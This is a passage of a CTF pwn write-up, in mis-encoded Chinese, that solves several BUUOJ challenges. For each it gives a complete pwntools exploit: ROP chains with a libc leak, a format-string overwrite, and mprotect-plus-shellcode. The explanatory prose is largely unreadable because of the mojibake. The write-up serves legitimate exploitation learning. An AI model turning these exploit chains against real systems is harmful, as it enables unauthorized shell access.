<p>æ¥ä¸‹æ¥è€ƒè™‘æ„é€ ropé“¾getshellï¼ŒåŸºæœ¬ä¸Šå·²ç»æ˜¯å›ºå®šå¥—è·¯äº†ï¼Œ<strong>é¦–å…ˆç”¨<code>puts()</code>å‡½æ•°æ³„æ¼å‡º<code>puts()</code>çš„çœŸå®åœ°å€ï¼ŒåŒæ—¶ç”±äºé¢˜ç›®æ²¡æœ‰ç»™å‡ºlibcæ–‡ä»¶ï¼Œæ•…æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘ç”¨<code>LibcSearcher</code>è·å–libcï¼Œç„¶ålibcçš„åŸºå€ã€<code>/bin/sh</code>å’Œ<code>system()</code>çš„åœ°å€å°±éƒ½å‡ºæ¥äº†ï¼Œé…åˆä¸Šcsuä¸­çš„gadgetå³å¯getshell</strong></p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25348</span>)<span class="comment">#process(&#x27;./ciscn_2019_en_2&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_en_2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400b28</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">retn = <span class="number">0x400c84</span></span><br><span class="line">offset = <span class="number">0x50</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">1</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;text\n\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">1</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(retn) +p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/09/18/7AoReBMP9Lr3Ojb.png" alt="image.png"></p>
<blockquote>
<p>éœ€è¦æ³¨æ„çš„æ˜¯Ubuntu 18æœ‰çš„æ—¶å€™ä¼šå­˜åœ¨æ ˆæ— æ³•å¯¹é½çš„æƒ…å†µï¼Œå¯ä»¥å¤šä½¿ç”¨å‡ æ¬¡<code>retn</code>çš„gadgetæ¥å¯¹å…¶æ ˆ</p>
</blockquote>
<h2 id="0x00A-ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5-fmtstr"><a href="#0x00A-ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5-fmtstr" class="headerlink" title="0x00A.[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 - fmtstr"></a>0x00A.[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 - fmtstr</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°å¼€äº†NXä¿æŠ¤å’Œcanary</p>
<p><img src="https://i.loli.net/2020/09/18/UyvYwOl6x1RH4hE.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼š</p>
<p><img src="https://i.loli.net/2020/09/18/ZweqQ3kByjGUmVK.png" alt="image.png"></p>
<p>è¯¥ç¨‹åºè·å–ä¸€ä¸ªéšæœºæ•°ï¼Œè¯»å…¥åˆ°<code>0x804c044</code>ä¸Šï¼Œéšåä¸¤æ¬¡è¯»å…¥ç”¨æˆ·è¾“å…¥å¹¶åˆ¤æ–­ç¬¬äºŒæ¬¡è¾“å…¥ä¸éšæœºæ•°æ˜¯å¦ç›¸åŒï¼Œç›¸åŒåˆ™å¯ä»¥è·å¾—shell</p>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°å­˜åœ¨<strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</strong>ï¼Œå¯ä»¥è¿›è¡Œ<strong>ä»»æ„åœ°å€è¯»ä¸ä»»æ„åœ°å€å†™</strong>ï¼Œæ•…è€ƒè™‘å°†<code>0x804c044</code>åœ°å€ä¸Šçš„éšæœºæ•°è¦†å†™ä¸ºæˆ‘ä»¬æƒ³è¦çš„å€¼ï¼Œéšåç›´æ¥è¾“å…¥æˆ‘ä»¬è¦†å†™çš„å€¼å³å¯getshell</p>
<p>åŒæ—¶æˆ‘ä»¬ç®€å•çš„è·‘ä¸€ä¸‹è¿™ä¸ªç¨‹åºå°±å¯ä»¥çŸ¥é“æ ¼å¼å­—ç¬¦ä¸²æ˜¯ä½äºæ ˆä¸Šçš„ç¬¬10ä¸ªå‚æ•°ï¼ˆâ€aaaaâ€ &#x3D;&#x3D; 0x61616161ï¼‰</p>
<p><img src="https://i.loli.net/2020/09/18/Qiglex7ZCfsFhub.png" alt="image.png"></p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨pwntoolsä¸­çš„<code>fmtstr_payload()</code>æ¥æ¯”è¾ƒæ–¹ä¾¿åœ°æ„é€ èƒ½å¤Ÿè¿›è¡Œä»»æ„åœ°å€å†™çš„payload</p>
<blockquote>
<p>å…·ä½“ç”¨æ³•å¯ä»¥ç™¾åº¦ï¼Œè¿™é‡Œå°±ä¸å†æ‘˜æŠ„ä¸€éäº†</p>
</blockquote>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;<span class="number">0x804c044</span>:<span class="number">0x1</span>&#125;)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,25595)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/09/18/81KUdhp5EWb2JgP.png" alt="image.png"></p>
<h2 id="0x00B-get-started-3dsctf-2016-ret2text-ret2shellcode"><a href="#0x00B-get-started-3dsctf-2016-ret2text-ret2shellcode" class="headerlink" title="0x00B.get_started_3dsctf_2016 - ret2text || ret2shellcode"></a>0x00B.get_started_3dsctf_2016 - ret2text || ret2shellcode</h2><blockquote>
<p>æ³¨ï¼šè¿™æ˜¯ä¸€é“å±‘é¢˜</p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/18/XZEnHkaoDL6puN4.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå¯ä»¥å‘ç°å­˜åœ¨ä¸€ä¸ªèµ¤è£¸è£¸çš„<code>gets()</code>æº¢å‡º</p>
<p><img src="https://i.loli.net/2020/09/18/KHx7Dz9kULZpIRd.png" alt="image.png"></p>
<p>åŒæ—¶å­˜åœ¨ä¸€ä¸ª<code>get_flag()</code>å‡½æ•°å¯ä»¥è·å–flagï¼Œä¸è¿‡è¦æ±‚å‚æ•°1ä¸º<code>0x308cd64f</code>ï¼Œå‚æ•°2ä¸º<code>0x195719d1</code></p>
<p><img src="https://i.loli.net/2020/09/18/H7PwgMDErGxZcRi.png" alt="image.png"></p>
<h3 id="è§£æ³•1ï¼šret2text"><a href="#è§£æ³•1ï¼šret2text" class="headerlink" title="è§£æ³•1ï¼šret2text"></a>è§£æ³•1ï¼šret2text</h3><p>32ä½ç¨‹åºé€šè¿‡æ ˆä¼ å‚ï¼Œæ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span> + p32(<span class="number">0x80489A0</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x308CD64F</span>) + p32(<span class="number">0x195719D1</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>ä¸è¿‡å¾ˆæ˜æ˜¾ï¼Œå‡ºé¢˜äººçš„ç¯å¢ƒå¾ˆæ˜æ˜¾æœ‰ä¸¶å°é—®é¢˜ğŸ”¨ğŸ”¨ğŸ”¨ï¼Œè¿œç¨‹è·‘ä¸é€šè¿™ä¸ªpayload</p>
<p><img src="https://i.loli.net/2020/10/07/6ZxFokbJUwI2YVS.png" alt="image.png"></p>
<p>é—®é¢˜å‡ºåœ¨å“ªå‘¢ï¼Ÿè¯¥ç¨‹åºå°è¯•æ‰“å¼€çš„æ˜¯<code>flag.txt</code>æ–‡ä»¶ï¼Œä½†æ˜¯å¹³å°æ‰€è‡ªåŠ¨ç”Ÿæˆçš„æ˜¯<code>flag</code>æ–‡ä»¶ï¼Œæ•…æ­¤ç§æ–¹æ³•<strong>æ— æ³•è·å¾—flag</strong></p>
<p>æˆ‘ä»¬å°è¯•å¯»æ‰¾ç¬¬äºŒç§è§£æ³•</p>
<h3 id="è§£æ³•2ï¼šret2shellcode"><a href="#è§£æ³•2ï¼šret2shellcode" class="headerlink" title="è§£æ³•2ï¼šret2shellcode"></a>è§£æ³•2ï¼šret2shellcode</h3><p>é¦–å…ˆæˆ‘ä»¬å‘ç°åœ¨ç¨‹åºä¸­ç¼–å…¥äº†å¤§é‡çš„å‡½æ•°ï¼Œå…¶ä¸­å°±åŒ…æ‹¬<code>mprotect()</code>ï¼Œå¯ä»¥ä¿®æ”¹æŒ‡å®šå†…å­˜åœ°å€çš„æƒé™</p>
<p><img src="https://i.loli.net/2020/09/19/JX5nSQwg9dFTufU.png" alt="image.png"></p>
<p>æ•…è€ƒè™‘ä½¿ç”¨<code>mprotect()</code>ä¿®æ”¹å†…å­˜æ®µæƒé™ä¸ºå¯è¯»å¯å†™å¯è¿è¡Œååœ¨ä¸Šé¢å†™å…¥shellcodeå¹¶è·³è½¬è‡³å†…å­˜æ®µæ‰§è¡Œshellcodeä»¥getshell</p>
<p>åœ¨<strong>pwndbg</strong>ä¸­ä½¿ç”¨<code>vmmap</code>æŸ¥çœ‹å¯ä»¥ç”¨çš„å†…å­˜æ®µï¼Œå‰é¢ä¸‰ä¸ªæ®µéšä¾¿é€‰ä¸€ä¸ªå°±è¡Œ</p>
<p><img src="https://i.loli.net/2020/09/20/1nXPY9VqgLaQtmR.png" alt="image.png"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨å°†<code>mprotect()</code>çš„å‚æ•°å¼¹å‡ºï¼ˆæ—¥å¸¸è¸©å‘ï¼‰</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,29719)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_ebx_esi_edi_ebp_ret = <span class="number">0x804951c</span></span><br><span class="line">mprotect_addr = e.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = e.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sc_addr = <span class="number">0x80ec000</span></span><br><span class="line">offset = <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(mprotect_addr) + p32(pop_ebx_esi_edi_ebp_ret) + p32(sc_addr) + p32(<span class="number">0x100</span>) + p32(<span class="number">0x7</span>) + p32(<span class="number">0xdeadbeef</span>)  + p32(read_addr) + p32(sc_addr) + p32(<span class="number">0</span>) + p32(sc_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">payload2 = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬å³å¯getshell</p>
<p><img src="https://i.loli.net/2020/09/20/dk9jnLSZRt1qwXO.png" alt="image.png"></p>
<h2 id="0x00C-ciscn-2019-n-8-overwrite"><a href="#0x00C-ciscn-2019-n-8-overwrite" class="headerlink" title="0x00C.ciscn_2019_n_8 - overwrite"></a>0x00C.ciscn_2019_n_8 - overwrite</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°å¼€äº†<strong>æ ˆä¸å¯æ‰§è¡Œã€åœ°å€éšæœºåŒ–ã€Canary</strong>ä¸‰å¤§ä¿æŠ¤ï¼ˆ<del>å™”  å™”  å’š</del></p>
<p><img src="https://i.loli.net/2020/09/20/OqJDm4QUE367nWM.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/09/20/2dOMiusme5lUfhc.png" alt="image.png"></p>
<p>ä½¿ç”¨scanfè¯»å…¥å­—ç¬¦ä¸²åˆ°å˜é‡<code>var</code>ï¼Œå­˜åœ¨æ¼æ´ï¼ŒåŒæ—¶ç¨‹åºä¼šå°†varçš„åœ°å€è½¬æ¢ä¸ºä¸€ä¸ª(_QWORD)ç±»å‹æŒ‡é’ˆï¼ˆé•¿åº¦ä¸ºå››å­—èŠ‚ï¼‰ï¼Œå¹¶åˆ¤æ–­<code>var[13]</code>æ˜¯å¦ä¸º<code>0x11</code>ï¼Œè‹¥æ˜¯åˆ™è¿”å›ä¸€ä¸ªshell</p>
<p>æ•…è€ƒè™‘ç›´æ¥è¾“å…¥å°†<code>var[13]</code>è¦†å†™ä¸º<code>0x11</code>å³å¯getshell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">13</span>*<span class="number">4</span> + p32(<span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_8&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,29901)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/09/20/4RHWBEUrOSaPhXw.png" alt="image.png"></p>
<h2 id="0x00D-not-the-same-3dsctf-2016-ret2shellcode"><a href="#0x00D-not-the-same-3dsctf-2016-ret2shellcode" class="headerlink" title="0x00D.not_the_same_3dsctf_2016 - ret2shellcode"></a>0x00D.not_the_same_3dsctf_2016 - ret2shellcode</h2><blockquote>
<p>not the sameï¼ˆæŒ‡ the sameï¼ˆ</p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/20/lxh7UmuzOJIRvbW.png" alt="image.png"></p>
<p>æ‹–è¿›IDAé‡Œåº·åº·</p>
<p><img src="https://i.loli.net/2020/09/20/FGmtAInhU9Dcx1a.png" alt="image.png"></p>
<p>ä¸»å‡½æ•°ä¸­ç›´æ¥å­˜åœ¨å¯ä»¥è¢«åˆ©ç”¨çš„<code>gets()</code>å‡½æ•°ï¼ŒåŒæ—¶è¿˜ç»™äº†æˆ‘ä»¬ä¸€ä¸ªæç¤ºä¿¡æ¯â€”â€”<strong>bora ver se tu ah o bichao memo</strong>ï¼Œå¤§è‡´å¯ä»¥ç¿»è¯‘ä¸ºï¼š<strong>Did you see the wrong note?</strong><del>çœ‹èµ·æ¥ä¼¼ä¹æ²¡ä»€ä¹ˆç”¨çš„æ ·å­</del></p>
<p>å°è¯•å…ˆä½¿ç”¨ä¸å‰ä¸€é¢˜ç›¸åŒçš„æ€è·¯æ¥è§£</p>
<p>é¦–å…ˆç”¨<code>pwndbg</code>çš„<code>vmmap</code>æŸ¥çœ‹å¯ä»¥ç”¨çš„å†…å­˜</p>
<p><img src="https://i.loli.net/2020/09/20/3MkHWsKtXChuezG.png" alt="image.png"></p>
<p>åŒæ—¶IDAä¸­æˆ‘ä»¬å‘ç°ç¨‹åºä¸­ä¾ç„¶å­˜åœ¨<code>mprotect()</code>å‡½æ•°å¯ä»¥æ”¹å†™æƒé™</p>
<p><img src="https://i.loli.net/2020/09/20/4IebV5KgXMrA9Go.png" alt="image.png"></p>
<p>å’Œå‰ä¸€é¢˜æ‰€ä¸åŒçš„æ˜¯gadgetçš„ä½ç½®æœ‰ä¸¶å°å˜åŒ–ï¼ˆ<del>åŸæ¥åªæœ‰è¿™ä¸ªä¸åŒğŸ</del>ï¼‰</p>
<p><img src="https://i.loli.net/2020/09/20/b8JLWav12ru9SFE.png" alt="image.png"></p>
<p>æ•…æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>ä¸å‰ä¸€é¢˜å‡ ä¹å®Œå…¨ç›¸åŒçš„exp</strong>æ¥getshellï¼Œåªéœ€è¦æŠŠcsué‡Œçš„gadgetçš„åœ°å€ç¨å¾®ä¿®æ”¹ä¸€ä¸‹å³å¯</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,28147)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_ebx_esi_edi_ebp_ret = <span class="number">0x80494dc</span></span><br><span class="line">mprotect_addr = e.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = e.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sc_addr = <span class="number">0x80ea000</span></span><br><span class="line">offset = <span class="number">0x2d</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(mprotect_addr) + p32(pop_ebx_esi_edi_ebp_ret) + p32(sc_addr) + p32(<span class="number">0x100</span>) + p32(<span class="number">0x7</span>) + p32(<span class="number">0xdeadbeef</span>)  + p32(read_addr) + p32(sc_addr) + p32(<span class="number">0</span>) + p32(sc_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">payload2 = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬å³å¾—shell</p>
<p><img src="https://i.loli.net/2020/09/20/WNngpZqb32UfarH.png" alt="image.png"></p>
<h2 id="0x00E-jarvisoj-level2-ret2text"><a href="#0x00E-jarvisoj-level2-ret2text" class="headerlink" title="0x00E.jarvisoj_level2 - ret2text"></a>0x00E.jarvisoj_level2 - ret2text</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/21/Fy45LtX2TbDZmCw.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/09/21/udFMIAQECL71B3D.png" alt="image.png"></p>
<p>è¯»å…¥æœ€å¤§0x100å­—èŠ‚ï¼Œä½†æ˜¯<code>buf</code>åˆ°ebpä¹‹é—´åªæœ‰0x88å­—èŠ‚çš„ç©ºé—´ï¼Œå­˜åœ¨æº¢å‡º</p>
<p>åŒæ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥çŸ¥é“è¯¥ç¨‹åºä¸­æœ‰<code>system()</code>å‡½æ•°å¯ä»¥åˆ©ç”¨</p>
<p>åŒæ—¶ç¨‹åºä¸­è¿˜å­˜åœ¨<code>&quot;/bin/sh&quot;</code>å­—ç¬¦ä¸²</p>
<p><img src="https://i.loli.net/2020/09/21/ODpha1fMLGsxdHN.png" alt="image.png"></p>
<p>æ•…åªéœ€è¦æ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯getshell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level2&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,26276)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line">sh_addr = <span class="number">0x804A024</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span> + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;system&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/09/21/1SBivHVUXTmd6rM.png" alt="image.png"></p>
<h2 id="0x00F-HarekazeCTF2019-baby-rop-ret2text-ret2csu"><a href="#0x00F-HarekazeCTF2019-baby-rop-ret2text-ret2csu" class="headerlink" title="0x00F.[HarekazeCTF2019]baby_rop - ret2text + ret2csu"></a>0x00F.[HarekazeCTF2019]baby_rop - ret2text + ret2csu</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/21/KLwbUyHQnN3YWTR.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/09/21/ERABfyXm6k1dvZl.png" alt="image.png"></p>
<p>ä½¿ç”¨<code>scanf(&quot;%s&quot;)</code>è¯»å…¥å­—ç¬¦ä¸²ï¼Œå­˜åœ¨æº¢å‡ºæ¼æ´</p>
<p><img src="https://i.loli.net/2020/09/21/OSY69XjyadgBbV2.png" alt="image.png"></p>
<p>å­˜åœ¨<code>system()</code>å‡½æ•°</p>
<p><img src="https://i.loli.net/2020/09/21/IX7bcApO3V8axJ1.png" alt="image.png"></p>
<p>å­˜åœ¨<code>/bin/sh</code>å­—ç¬¦ä¸²</p>
<p>æ•…è€ƒè™‘ä½¿ç”¨csuä¸­gadgetæ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å‡½æ•°ä»¥getshell</p>
<p><img src="https://i.loli.net/2020/09/21/jJeyg9MLalYGnZX.png" alt="image.png"></p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x601048</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400683</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27558</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) +  p64(sh_addr) + p64(e.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¾—flag</p>
<p><img src="https://i.loli.net/2020/09/21/P4QqLJyplu2xF9r.png" alt="image.png"></p>
<blockquote>
<p>å¥½å¤šä¸€æ ·çš„é¢˜å•ŠOr2</p>
</blockquote>
<h2 id="0x010-bjdctf-2020-babystack-ret2text"><a href="#0x010-bjdctf-2020-babystack-ret2text" class="headerlink" title="0x010.bjdctf_2020_babystack - ret2text"></a>0x010.bjdctf_2020_babystack - ret2text</h2><blockquote>
<p>åˆæ˜¯ä¸€æ¨¡ä¸€æ ·çš„é¢˜ã€‚ã€‚ã€‚</p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
